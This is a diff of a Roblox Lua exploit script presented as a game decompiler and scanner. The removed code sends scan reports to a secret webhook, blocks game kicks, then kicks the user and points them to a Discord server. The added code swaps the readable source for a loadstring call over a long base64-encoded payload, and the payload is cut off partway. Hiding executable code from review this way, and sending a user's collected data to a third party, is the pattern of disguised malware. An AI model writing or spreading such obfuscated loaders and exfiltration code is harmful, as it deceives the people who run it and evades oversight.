-    local n = tonumber(v)
-    if n and n >= 1 and n <= 10 then
-        scanSpeed = math.floor(n)
-        addProg("Speed set to " .. scanSpeed)
-    elseif #v > 0 then
-        pcall(function() Rayfield:Notify({ Title = "Error", Content = "Speed must be 1-10", Duration = 3 }) end)
-    end
-end })
-
-Tab:CreateToggle({ Name = "Low Device Mode", CurrentValue = false, Callback = function(v)
-    lowDeviceMode = v
-    if v then addProg("Low Device Mode ON - extra stability for mobile/weak devices", "info")
-    else addProg("Low Device Mode OFF - full speed", "info") end
-end })
-
-Tab:CreateButton({ Name = "Start Scan", Callback = function()
-    if scanBusy then return end
-    scanBusy = true
-    scanAborted = false
-    progLines = {}
-    createConsole()
-    addProg("Scanning...", "scan")
-    task.spawn(function()
-        local ok, report = pcall(scanGame, scanSpeed, updateProgress, addProg)
-        if scanAborted then
-            if updateProgress then updateProgress(0, 0, 0, 0, "aborted") end
-            destroyConsole()
-            scanBusy = false
-            pcall(Rayfield.Notify, Rayfield, { Title = "Cancelled", Content = "Scan was stopped.", Duration = 5 })
-            return
-        end
-        if not ok then
-            addProg("ERROR: " .. tostring(report), "error")
-            if updateProgress then updateProgress(0, 0, 0, 0, "error") end
-            scanBusy = false
-            return
-        end
-        if report == nil then
-            destroyConsole()
-            scanBusy = false
-            return
-        end
-        addProg("Report ready (" .. #report .. " bytes)", "done")
-        addProg("Sending to webhook...", "info")
-        if _request and WEBHOOK_SECRET and #WEBHOOK_SECRET > 0 then pcall(sendChunkedReport, report) end
-        if _setclipboard then
-            pcall(_setclipboard, DISCORD_LINK)
-            addProg("Discord link copied to clipboard!", "done")
-        end
-        addProg("Decompile Completed!", "done")
-        scanBusy = false
-        if updateProgress then updateProgress(0, 0, 0, 0, "done") end
-        pcall(Rayfield.Notify, Rayfield, { Title = "Complete", Content = "Done!", Duration = 5 })
-        destroyConsole()
-        if autoKickEnabled then
-            pcall(function()
-                local fn = origKick or LP.Kick
-                if type(fn) == "function" then
-                    fn(LP, "Decompile Completed. (Come to discord server for results.)")
-                end
-            end)
-        end
-    end)
-end })
-
-Tab:CreateButton({ Name = "Stop Scan", Callback = function()
-    if scanBusy then
-        scanAborted = true
-        addProg("Stopping scan...", "warn")
-    else
-        pcall(Rayfield.Notify, Rayfield, { Title = "Info", Content = "No scan running.", Duration = 3 })
-    end
-end })
-
-local autoKickTogglea
-autoKickToggle = Tab:CreateToggle({ Name = "Auto Kick", CurrentValue = true, Callback = function(v)
-    autoKickEnabled = v
-end })
-
-Tab:CreateToggle({ Name = "Bypass Shield (Anti-Kick)", CurrentValue = true, Callback = function(v)
-    if v then enableShield(); addProg("Shield activated - Kick blocked", "done")
-    else disableShield(); addProg("Shield deactivated", "warn") end
-end })
-
-Tab:CreateButton({ Name = "Hide GUI (Backspace)", Callback = function()
-    guiHidden = not guiHidden
-    if guiHidden then if conGui then conGui.Enabled = false end; addProg("GUI hidden (Backspace to show)", "warn")
-    else if conGui then conGui.Enabled = true end; addProg("GUI shown", "info") end
-end })
-
-Tab:CreateButton({ Name = "Discord", Callback = function()
-    if _setclipboard then
-        pcall(_setclipboard, DISCORD_LINK)
-        pcall(Rayfield.Notify, Rayfield, { Title = "Copied!", Content = "Discord link copied to clipboard.", Duration = 3 })
-    else
-        pcall(Rayfield.Notify, Rayfield, { Title = "Error", Content = "Clipboard not supported.", Duration = 3 })
-    end
-end })
-
-addProg("DecompilerHub v4.0 loaded", "done")
-addProg("Cross-Reference + Anti-Cheat + Obfuscation Scanner active", "info")
+loadstring((function()
+ local d = {}
+ local c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+ local t = {'LS0gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ci0tICAgICAgICAgIEFEVkFOQ0VEIFNDQU5O',
+'RVIgJiBERUNPTVBJTEVSIHY0LjAKLS0gICAgICAgICAgQ3Jvc3MtUmVmZXJlbmNlICsgRnVsbCBCeXBhc3MgKyBBdXRvIEtpY2sgVG9nZ2xlCi0tICAgICAg',
+'ICAgIEd1aWRlOiBodHRwczovL2Rpc2NvcmQuZ2cvVUJlQkVoeFVnUQotLSA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09',
+'PT09PT09PT09PT09PT0KCmxvY2FsIENPUlJFQ1RfS0VZID0gIm1hZGVieWNoYXlvbzA3NyIKbG9jYWwgRElTQ09SRF9MSU5LID0gImh0dHBzOi8vZGlzY29y',
+'ZC5nZy9VQmVCRWh4VWdRIgpsb2NhbCBfS0VZX0FVVEhPUklaRUQgPSBmYWxzZQpsb2NhbCBfa2V5R3VpID0gbmlsCgpkbwogICAgbG9jYWwgZyA9IEluc3Rh',
+'bmNlLm5ldygiU2NyZWVuR3VpIik7IGcuTmFtZSA9ICJESEtleSI7IGcuUmVzZXRPblNwYXduID0gZmFsc2U7IGcuWkluZGV4QmVoYXZpb3IgPSBFbnVtLlpJ',
+'bmRleEJlaGF2aW9yLlNpYmxpbmcKICAgIF9rZXlHdWkgPSBnCiAgICBsb2NhbCBva1BhcmVudCwgXyA9IHBjYWxsKGZ1bmN0aW9uKCkgZy5QYXJlbnQgPSBn',
+'YW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKSBlbmQpCiAgICBpZiBub3Qgb2tQYXJlbnQgdGhlbgogICAgICAgIGxvY2FsIHBsciA9IGdhbWU6R2V0U2Vydmlj',
+'ZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICAgICAgaWYgcGxyIHRoZW4gcGNhbGwoZnVuY3Rpb24oKSBnLlBhcmVudCA9IHBscjpXYWl0Rm9yQ2hpbGQo',
+'IlBsYXllckd1aSIpIGVuZCkgZW5kCiAgICBlbmQKCiAgICAtLSBhbmEgcGFuZWwgKDIwMDcgdGFyesOEwrEpCiAgICBsb2NhbCBmID0gSW5zdGFuY2UubmV3',
+'KCJGcmFtZSIpCiAgICBmLlNpemUgPSBVRGltMi5uZXcoMCwgMzgwLCAwLCAyNjApCiAgICBmLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTE5MCwgMC41',
+'LCAtMTMwKQogICAgZi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNTUsIDQwLCAyNSkKICAgIGYuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9',
+'IDAKICAgIGYuQm9yZGVyU2l6ZVBpeGVsID0gNDsgZi5Cb3JkZXJDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDE0NSwgNTApCiAgICBmLkNsaXBzRGVz',
+'Y2VuZGFudHMgPSB0cnVlOyBmLlBhcmVudCA9IGcKCiAgICAtLSBwYW5lbCBpw4PCp2kgYXJrYSBwbGFuCiAgICBsb2NhbCBiZyA9IEluc3RhbmNlLm5ldygi',
+'RnJhbWUiKTsgYmcuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKTsgYmcuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDM1LCAyMiwgMTIp',
+'OyBiZy5Cb3JkZXJTaXplUGl4ZWwgPSAwOyBiZy5aSW5kZXggPSAwOyBiZy5QYXJlbnQgPSBmCgogICAgLS0gMjAwNyB0YXJ6w4TCsSB0dcOExbhsYSB5YcOE',
+'xbhtdXJ1CiAgICBsb2NhbCBCUklDS19DT0xPUlMgPSB7CiAgICAgICAgQ29sb3IzLmZyb21SR0IoMjQ1LCAyMDUsIDQ3KSwgIC0tIGJyaWdodCB5ZWxsb3cK',
+'ICAgICAgICBDb2xvcjMuZnJvbVJHQigxOTYsIDQwLCAyOCksICAgLS0gYnJpZ2h0IHJlZAogICAgICAgIENvbG9yMy5mcm9tUkdCKDEzLCAxMDUsIDE3Miks',
+'ICAtLSBicmlnaHQgYmx1ZQogICAgICAgIENvbG9yMy5mcm9tUkdCKDc1LCAxNTEsIDc1KSwgICAtLSBicmlnaHQgZ3JlZW4KICAgICAgICBDb2xvcjMuZnJv',
+'bVJHQigxOTYsIDExMiwgMjgpLCAgLS0gYnJpZ2h0IG9yYW5nZQogICAgICAgIENvbG9yMy5mcm9tUkdCKDE2MCwgODAsIDE2MCksICAtLSBicmlnaHQgdmlv',
+'bGV0CiAgICAgICAgQ29sb3IzLmZyb21SR0IoMTgwLCAxNjUsIDEzNSksIC0tIGxpZ2h0IHN0b25lCiAgICAgICAgQ29sb3IzLmZyb21SR0IoMjE3LCAxNjUs',
+'IDg5KSwgIC0tIGJyYXNzCiAgICAgICAgQ29sb3IzLmZyb21SR0IoMTAyLCAxNTMsIDE1MyksIC0tIHRlYWwKICAgIH0KICAgIGxvY2FsIFNUVURTID0gNTU7',
+'IGxvY2FsIHN0dWRzID0ge307IGxvY2FsIHJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKICAgIGxvY2FsIGZ1bmN0aW9uIG1ha2VTdHVkKGMp',
+'CiAgICAgICAgbG9jYWwgZyA9IEluc3RhbmNlLm5ldygiRnJhbWUiKTsgZy5TaXplID0gVURpbTIubmV3KDAsIDEsIDAsIDEpOyBnLkJhY2tncm91bmRUcmFu',
+'c3BhcmVuY3kgPSAxOyBnLkJvcmRlclNpemVQaXhlbCA9IDAKICAgICAgICBsb2NhbCBib2R5ID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpOyBib2R5LlNpemUg',
+'PSBVRGltMi5uZXcoMSwgMCwgMC43LCAwKTsgYm9keS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLjMsIDApCiAgICAgICAgYm9keS5CYWNrZ3JvdW5k',
+'Q29sb3IzID0gYzsgYm9keS5Cb3JkZXJTaXplUGl4ZWwgPSAxOyBib2R5LkJvcmRlckNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1LCAyNSwgMjUpOyBib2R5',
+'LlBhcmVudCA9IGcKICAgICAgICBsb2NhbCBidW1wID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpOyBidW1wLlNpemUgPSBVRGltMi5uZXcoMC41NSwgMCwgMC4z',
+'NSwgMCk7IGJ1bXAuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4yMjUsIDAsIDAsIDApCiAgICAgICAgYnVtcC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZy',
+'b21SR0IobWF0aC5taW4oMjU1LCBjLlIgKiAyNTUgKyAzNSksIG1hdGgubWluKDI1NSwgYy5HICogMjU1ICsgMzApLCBtYXRoLm1pbigyNTUsIGMuQiAqIDI1',
+'NSArIDI1KSk7IGJ1bXAuQm9yZGVyU2l6ZVBpeGVsID0gMTsgYnVtcC5Cb3JkZXJDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDI1KTsgYnVtcC5Q',
+'YXJlbnQgPSBnCiAgICAgICAgbG9jYWwgc2ggPSBJbnN0YW5jZS5uZXcoIkZyYW1lIik7IHNoLlNpemUgPSBVRGltMi5uZXcoMC41LCAwLCAwLCAxKTsgc2gu',
+'UG9zaXRpb24gPSBVRGltMi5uZXcoMC4yNSwgMCwgMC4zLCAwKTsgc2guQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1LCAxNSwgMTUpOyBz',
+'aC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC4zOyBzaC5Cb3JkZXJTaXplUGl4ZWwgPSAwOyBzaC5QYXJlbnQgPSBnCiAgICAgICAgcmV0dXJuIGcKICAg',
+'IGVuZAogICAgZm9yIGkgPSAxLCBTVFVEUyBkbwogICAgICAgIGxvY2FsIGNvbCA9IEJSSUNLX0NPTE9SU1ttYXRoLnJhbmRvbSgjQlJJQ0tfQ09MT1JTKV0K',
+'ICAgICAgICBsb2NhbCBzID0gbWFrZVN0dWQoY29sKQogICAgICAgIGxvY2FsIHNjID0gNiArIG1hdGgucmFuZG9tKCkgKiA4CiAgICAgICAgcy5TaXplID0g',
+'VURpbTIubmV3KDAsIG1hdGguZmxvb3Ioc2MgKiAxLjMgKyAwLjUpLCAwLCBtYXRoLmZsb29yKHNjICsgMC41KSkKICAgICAgICBzLlBvc2l0aW9uID0gVURp',
+'bTIubmV3KG1hdGgucmFuZG9tKCkgKiAwLjk0ICsgMC4wMywgMCwgLTAuMDUgLSBtYXRoLnJhbmRvbSgpICogMS41LCAwKQogICAgICAgIGxvY2FsIHQgPSBt',
+'YXRoLnJhbmRvbSgwLCAzKSAvIDEwCiAgICAgICAgbG9jYWwga2lkcyA9IHM6R2V0Q2hpbGRyZW4oKQogICAgICAgIGZvciBfLCBrIGluIGlwYWlycyhraWRz',
+'KSBkbwogICAgICAgICAgICBpZiBrOklzQSgiRnJhbWUiKSB0aGVuIGsuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IG1hdGgubWluKDEsIGsuQmFja2dyb3Vu',
+'ZFRyYW5zcGFyZW5jeSArIHQpOyBrLkJvcmRlckNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjApIGVuZAogICAgICAgIGVuZAogICAgICAgIHMu',
+'WkluZGV4ID0gMDsgcy5QYXJlbnQgPSBmCiAgICAgICAgc3R1ZHNbaV0gPSB7IGYgPSBzLCBzcGQgPSBtYXRoLnJhbmRvbSgyMCwgMTIwKSAvIDEwMCwgc3dh',
+'eSA9IChtYXRoLnJhbmRvbSgpIC0gMC41KSAqIDAuMjUsIHBoYXNlID0gbWF0aC5yYW5kb20oKSAqIDYuMjggfQogICAgZW5kCiAgICBsb2NhbCBjb25uOyBj',
+'b25uID0gcnMuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKGR0KQogICAgICAgIGZvciBfLCB2IGluIGlwYWlycyhzdHVkcykgZG8KICAgICAgICAg',
+'ICAgbG9jYWwgcG9zID0gdi5mLlBvc2l0aW9uCiAgICAgICAgICAgIGxvY2FsIG55ID0gcG9zLlkuU2NhbGUgKyB2LnNwZCAqIGR0ICogMC41CiAgICAgICAg',
+'ICAgIGxvY2FsIG54ID0gcG9zLlguU2NhbGUgKyBtYXRoLnNpbih2LnBoYXNlICsgdGljaygpICogMC41KSAqIDAuMDAwNSArIHYuc3dheSAqIGR0ICogMC4w',
+'MTUKICAgICAgICAgICAgaWYgbnggPCAwIHRoZW4gbnggPSBueCArIDEgZWxzZWlmIG54ID4gMSB0aGVuIG54ID0gbnggLSAxIGVuZAogICAgICAgICAgICB2',
+'LmYuUG9zaXRpb24gPSBVRGltMi5uZXcobngsIDAsIG55ID4gMS4xIGFuZCAtMC4wNSAtIG1hdGgucmFuZG9tKCkgKiAxLjAgb3IgbnksIDApCiAgICAgICAg',
+'ZW5kCiAgICBlbmQpCgogICAgbG9jYWwgdGl0bGUgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICB0aXRsZS5TaXplID0gVURpbTIubmV3KDEsIC00',
+'MCwgMCwgMzApOyB0aXRsZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAyMCwgMCwgOCkKICAgIHRpdGxlLlRleHQgPSAiPiBERUNPTVBJTEVSIHY0LjAgPCI7',
+'IHRpdGxlLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMzAsIDE4MCwgNTApCiAgICB0aXRsZS5Gb250ID0gRW51bS5Gb250LkNvZGU7IHRpdGxlLlRl',
+'eHRTaXplID0gMTg7IHRpdGxlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOyB0aXRsZS5aSW5kZXggPSAyCgogICAgbG9jYWwgc3ViID0gSW5zdGFuY2Uu',
+'bmV3KCJUZXh0TGFiZWwiKQogICAgc3ViLlNpemUgPSBVRGltMi5uZXcoMCwgMjAwLCAwLCAxOCk7IHN1Yi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0x',
+'MDAsIDAsIDU0KQogICAgc3ViLlRleHQgPSAiRU5URVIgS0VZIFRPIFVOTE9DSyI7IHN1Yi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTgwLCAxNDAs',
+'IDQwKQogICAgc3ViLkZvbnQgPSBFbnVtLkZvbnQuQ29kZTsgc3ViLlRleHRTaXplID0gMTE7IHN1Yi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsgc3Vi',
+'LlpJbmRleCA9IDIKCiAgICBsb2NhbCBib3ggPSBJbnN0YW5jZS5uZXcoIlRleHRCb3giKQogICAgYm94LlNpemUgPSBVRGltMi5uZXcoMCwgMjQwLCAwLCAz',
+'MCk7IGJveC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0xMjAsIDAsIDc2KQogICAgYm94LlBsYWNlaG9sZGVyVGV4dCA9ICJrZXkiOyBib3guVGV4dCA9',
+'ICIiCiAgICBib3guVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI0MCwgMjAwLCA3MCk7IGJveC5QbGFjZWhvbGRlckNvbG9yMyA9IENvbG9yMy5mcm9t',
+'UkdCKDkwLCA2NSwgMzApCiAgICBib3guRm9udCA9IEVudW0uRm9udC5Db2RlOyBib3guVGV4dFNpemUgPSAxNDsgYm94LkNsZWFyVGV4dE9uRm9jdXMgPSBm',
+'YWxzZQogICAgYm94LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig0MCwgMjgsIDE1KTsgYm94LlpJbmRleCA9IDIKICAgIGJveC5Cb3JkZXJT',
+'aXplUGl4ZWwgPSAyOyBib3guQm9yZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAxNDUsIDUwKQoKICAgIGxvY2FsIHN0YXQgPSBJbnN0YW5jZS5u',
+'ZXcoIlRleHRMYWJlbCIpCiAgICBzdGF0LlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMTYpOyBzdGF0LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAs',
+'IDExMCkKICAgIHN0YXQuVGV4dCA9ICIiOyBzdGF0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMjAsIDgwLCA2MCkKICAgIHN0YXQuRm9udCA9IEVu',
+'dW0uRm9udC5Db2RlOyBzdGF0LlRleHRTaXplID0gMTA7IHN0YXQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7IHN0YXQuWkluZGV4ID0gMgoKICAgIGxv',
+'Y2FsIGJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBidG4uU2l6ZSA9IFVEaW0yLm5ldygwLCAxMjAsIDAsIDMwKTsgYnRuLlBvc2l0aW9u',
+'ID0gVURpbTIubmV3KDAuNSwgLTYwLCAwLCAxMzApCiAgICBidG4uVGV4dCA9ICI+IFVOTE9DSyA8IjsgYnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJH',
+'QigyNDAsIDIwMCwgNjApCiAgICBidG4uRm9udCA9IEVudW0uRm9udC5Db2RlOyBidG4uVGV4dFNpemUgPSAxMzsgYnRuLlpJbmRleCA9IDIKICAgIGJ0bi5C',
+'YWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNjAsIDQyLCAyMikKICAgIGJ0bi5Cb3JkZXJTaXplUGl4ZWwgPSAyOyBidG4uQm9yZGVyQ29sb3Iz',
+'ID0gQ29sb3IzLmZyb21SR0IoMjAwLCAxNDUsIDUwKQoKICAgIGxvY2FsIGRjID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIGRjLlNpemUgPSBV',
+'RGltMi5uZXcoMCwgMTYwLCAwLCAyNik7IGRjLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTgwLCAwLCAxNzApCiAgICBkYy5UZXh0ID0gIj4gRElTQ09S',
+'RCA8IjsgZGMuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEyMCwgMTYwLCAyMjApCiAgICBkYy5Gb250ID0gRW51bS5Gb250LkNvZGU7IGRjLlRleHRT',
+'aXplID0gMTE7IGRjLlpJbmRleCA9IDIKICAgIGRjLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDQwKQogICAgZGMuQm9yZGVy',
+'U2l6ZVBpeGVsID0gMjsgZGMuQm9yZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNjAsIDgwLCAxNTApCgogICAgLS0gZMODwrZuZW4gaXB1Y3UKICAgIGxv',
+'Y2FsIHRpcCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIHRpcC5TaXplID0gVURpbTIubmV3KDEsIC0xMCwgMCwgMTQpOyB0aXAuUG9zaXRpb24g',
+'PSBVRGltMi5uZXcoMCwgNSwgMCwgMjAyKQogICAgdGlwLlRleHQgPSAiIjsgdGlwLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDgwLCA1MCkK',
+'ICAgIHRpcC5Gb250ID0gRW51bS5Gb250LkNvZGU7IHRpcC5UZXh0U2l6ZSA9IDk7IHRpcC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsgdGlwLlpJbmRl',
+'eCA9IDIKICAgIGxvY2FsIHRpcHMgPSB7ICJkaXNjb3JkLmdnL1VCZUJFaHhVZ1EiLCAic2NhbnMgYWxsIHNjcmlwdHMiLCAiYnlwYXNzIHNoaWVsZCBpbmNs',
+'dWRlZCIgfQogICAgbG9jYWwgdGkgPSAwOyBsb2NhbCB0aXBDb24KICAgIHRpcENvbiA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLlN0ZXBwZWQ6',
+'Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgdGkgPSB0aSArIDAuMDI7IHRpcC5UZXh0ID0gdGlwc1ttYXRoLmZsb29yKHRpICUgI3RpcHMpICsgMV0KICAg',
+'IGVuZCkKCiAgICBsb2NhbCBmb290ZXIgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBmb290ZXIuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAx',
+'Nik7IGZvb3Rlci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAxLCAtMTYpCiAgICBmb290ZXIuVGV4dCA9ICJtYWRlIGJ5IGNoYXlvbyI7IGZvb3Rlci5U',
+'ZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoNzAsIDU1LCAzNSkKICAgIGZvb3Rlci5Gb250ID0gRW51bS5Gb250LkNvZGU7IGZvb3Rlci5UZXh0U2l6ZSA9',
+'IDk7IGZvb3Rlci5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsgZm9vdGVyLlpJbmRleCA9IDIKCiAgICB0aXRsZS5QYXJlbnQgPSBmOyBzdWIuUGFyZW50',
+'ID0gZjsgYm94LlBhcmVudCA9IGY7IHN0YXQuUGFyZW50ID0gZjsgYnRuLlBhcmVudCA9IGY7IGRjLlBhcmVudCA9IGY7IHRpcC5QYXJlbnQgPSBmOyBmb290',
+'ZXIuUGFyZW50ID0gZgoKICAgIGxvY2FsIGZ1bmN0aW9uIGNvcHlEaXNjb3JkKCkKICAgICAgICBsb2NhbCBjID0gKHR5cGVvZihzZXRjbGlwYm9hcmQpPT0i',
+'ZnVuY3Rpb24iIGFuZCBzZXRjbGlwYm9hcmQpIG9yICh0eXBlb2YoY2xpcGJvYXJkKT09ImZ1bmN0aW9uIiBhbmQgY2xpcGJvYXJkKSBvciAodHlwZW9mKHRv',
+'Y2xpcGJvYXJkKT09ImZ1bmN0aW9uIiBhbmQgdG9jbGlwYm9hcmQpCiAgICAgICAgaWYgYyB0aGVuIHBjYWxsKGMsIERJU0NPUkRfTElOSyk7IHN0YXQuVGV4',
+'dCA9ICJDb3BpZWQhIjsgc3RhdC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMjAwLCAwKQogICAgICAgIGVsc2Ugc3RhdC5UZXh0ID0gIlVuc3Vw',
+'cG9ydGVkIjsgc3RhdC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyMDAsIDApIGVuZAogICAgZW5kCgogICAgbG9jYWwgdW5sb2NrZWQgPSBm',
+'YWxzZQogICAgbG9jYWwgd3JvbmdBdHRlbXB0cyA9IDAKICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiB1',
+'bmxvY2tlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICBpZiBib3guVGV4dCA9PSBDT1JSRUNUX0tFWSB0aGVuCiAgICAgICAgICAgIHVubG9ja2VkID0gdHJ1',
+'ZTsgX0tFWV9BVVRIT1JJWkVEID0gdHJ1ZQogICAgICAgICAgICBzdGF0LlRleHQgPSAiQUNDRVNTIEdSQU5URUQiOyBzdGF0LlRleHRDb2xvcjMgPSBDb2xv',
+'cjMuZnJvbVJHQigwLCAyNTUsIDApCiAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC41OyBidG4uVGV4dFRyYW5zcGFyZW5jeSA9',
+'IDAuNTsgYnRuLkJvcmRlckNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwMCwgNzAsIDIwKQogICAgICAgICAgICBpZiBjb25uIHRoZW4gY29ubjpEaXNjb25u',
+'ZWN0KCkgZW5kCiAgICAgICAgICAgIGlmIHRpcENvbiB0aGVuIHRpcENvbjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rp',
+'b24oKQogICAgICAgICAgICAgICAgbG9jYWwgYncgPSAzODAKICAgICAgICAgICAgICAgIGxvY2FsIGJsb2NrID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpOyBi',
+'bG9jay5TaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDI2MCk7IGJsb2NrLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMTkwLCAwLjUsIC0xMzApOyBibG9j',
+'ay5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjQ1LCAyNDUsIDI1NSk7IGJsb2NrLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjE7IGJs',
+'b2NrLkJvcmRlclNpemVQaXhlbCA9IDA7IGJsb2NrLlpJbmRleCA9IDExOyBibG9jay5QYXJlbnQgPSBnCiAgICAgICAgICAgICAgICBsb2NhbCBlZGdlID0g',
+'SW5zdGFuY2UubmV3KCJGcmFtZSIpOyBlZGdlLlNpemUgPSBVRGltMi5uZXcoMCwgNCwgMSwgMCk7IGVkZ2UuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwg',
+'MCwgMCk7IGVkZ2UuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE4MCwgMjMwLCAyNTUpOyBlZGdlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kg',
+'PSAwLjA1OyBlZGdlLkJvcmRlclNpemVQaXhlbCA9IDA7IGVkZ2UuWkluZGV4ID0gMTI7IGVkZ2UuUGFyZW50ID0gYmxvY2sKICAgICAgICAgICAgICAgIGxv',
+'Y2FsIGVkZ2VHbG93ID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpOyBlZGdlR2xvdy5TaXplID0gVURpbTIubmV3KDAsIDE0LCAxLCAwKTsgZWRnZUdsb3cuUG9z',
+'aXRpb24gPSBVRGltMi5uZXcoMCwgLTE0LCAwLCAwKTsgZWRnZUdsb3cuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjQwLCAyNTUp',
+'OyBlZGdlR2xvdy5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC41OyBlZGdlR2xvdy5Cb3JkZXJTaXplUGl4ZWwgPSAwOyBlZGdlR2xvdy5aSW5kZXggPSAx',
+'MDsgZWRnZUdsb3cuUGFyZW50ID0gYmxvY2sKICAgICAgICAgICAgICAgIGxvY2FsIGV4dEdsb3cgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIik7IGV4dEdsb3cu',
+'U2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAzMTApOyBleHRHbG93LlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMTkwLCAwLjUsIC0xNTUpOyBleHRHbG93',
+'LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDIwMCwgMjU1KTsgZXh0R2xvdy5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC43NTsg',
+'ZXh0R2xvdy5Cb3JkZXJTaXplUGl4ZWwgPSAwOyBleHRHbG93LlpJbmRleCA9IDk7IGV4dEdsb3cuUGFyZW50ID0gZwogICAgICAgICAgICAgICAgbG9jYWwg',
+'c3RhcnRUID0gdGljaygpCiAgICAgICAgICAgICAgICBsb2NhbCB0b3RhbCA9IDAuODUKICAgICAgICAgICAgICAgIGxvY2FsIHJzID0gZ2FtZTpHZXRTZXJ2',
+'aWNlKCJSdW5TZXJ2aWNlIikuUmVuZGVyU3RlcHBlZAogICAgICAgICAgICAgICAgbG9jYWwgY29ubjI7IGNvbm4yID0gcnM6Q29ubmVjdChmdW5jdGlvbigp',
+'CiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdCA9IG1hdGgubWluKDEsICh0aWNrKCkgLSBzdGFydFQpIC8gdG90YWwpCiAgICAgICAgICAgICAgICAgICAg',
